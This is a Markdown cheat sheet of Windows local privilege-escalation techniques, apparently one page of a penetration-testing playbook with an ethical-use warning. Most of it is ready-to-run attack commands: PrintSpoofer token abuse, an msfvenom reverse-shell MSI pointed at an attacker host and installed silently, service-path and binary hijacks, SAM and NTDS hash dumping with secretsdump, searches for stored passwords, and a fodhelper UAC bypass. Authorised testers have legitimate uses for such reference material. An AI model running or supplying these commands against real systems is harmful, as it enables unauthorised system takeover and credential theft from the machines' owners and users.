# 🪟 Windows Privilege Escalation Cheatsheet

A quick checklist for finding local privilege escalation vectors on Windows machines.

> [!WARNING]
> **Ethical Use Only:** Use these techniques only on systems you own or have explicit written authorization to test.

## 🛠️ Automated Tools
Transfer and run these for rapid enumeration.
* **[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)**: `winPEASany.exe`
* **[PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)**: `Invoke-AllChecks`
* **[Seatbelt](https://github.com/GhostPack/Seatbelt)**: `Seatbelt.exe -group=all`

## 👤 System & User Information
```powershell
whoami /all               # Current user + privileges + groups
net user                  # List all local users
net localgroup administrators  # Who is a local admin?
systeminfo                # OS version, patch level, architecture
hostname
```

## 🔑 Checking Token Privileges
Look for these in `whoami /priv` — they are exploitable:

| Privilege | Exploit |
|-----------|---------|
| `SeImpersonatePrivilege` | **Potato attacks** (PrintSpoofer, GodPotato, RoguePotato) |
| `SeBackupPrivilege` | Read any file, including SAM/NTDS.dit |
| `SeDebugPrivilege` | Dump LSASS memory for credentials |
| `SeAssignPrimaryTokenPrivilege` | Similar to SeImpersonate |

```powershell
# Check privileges
whoami /priv

# PrintSpoofer (SeImpersonate)
PrintSpoofer.exe -i -c cmd
```

## 🗝️ AlwaysInstallElevated
If this registry key is set, any user can install MSI files as SYSTEM.
```powershell
# Check if enabled (both must return 0x1 to be vulnerable)
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Generate a malicious MSI with msfvenom (on attacker)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o shell.msi

# Execute on target
msiexec /quiet /qn /i shell.msi
```

## ⚙️ Unquoted Service Paths
If a service's binary path contains spaces and isn't quoted, Windows will look in wrong places.
```powershell
# Find unquoted service paths
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v "\""

# If you can write to one of the resolved paths, place a malicious binary there.
# Then restart the service:
sc stop VulnerableService
sc start VulnerableService
```

## 📁 Writable Service Binaries
If you can overwrite the binary that a service calls, you control what runs as SYSTEM.
```powershell
# Check permissions on a service binary
icacls "C:\Program Files\VulnerableApp\service.exe"

# Look for: BUILTIN\Users:(F) or Everyone:(F) — these are exploitable
```

## 🗄️ SAM & NTDS Credential Dumping
```powershell
# Dump SAM hashes (requires local admin or SeBackupPrivilege)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# On attacker — extract hashes with impacket
python3 secretsdump.py -sam SAM -system SYSTEM LOCAL

# On a Domain Controller, dump the whole NTDS database
python3 secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL
```

## 📜 Scheduled Tasks
```powershell
# List all scheduled tasks
schtasks /query /fo LIST /v | findstr "Task To Run\|Run As User"

# Look for tasks running as SYSTEM that call writable scripts/binaries
```

## 🔍 Credential Hunting
```powershell
# Search for passwords in common locations
findstr /si password *.xml *.ini *.txt *.config

# Check stored Windows credentials
cmdkey /list

# Unattend files (often contain plaintext or Base64 passwords)
dir /s *unattend.xml *sysprep.inf 2>nul

# Registry-stored credentials (AutoLogon)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## 🛡️ Bypass UAC (Common Techniques)
```powershell
# fodhelper.exe bypass (Windows 10)
Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name "(Default)" -Value "cmd.exe"
Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name "DelegateExecute" -Value ""
Start-Process "C:\Windows\System32\fodhelper.exe"
```

---
*Return to [SimplySec Playbook](../README.md)*
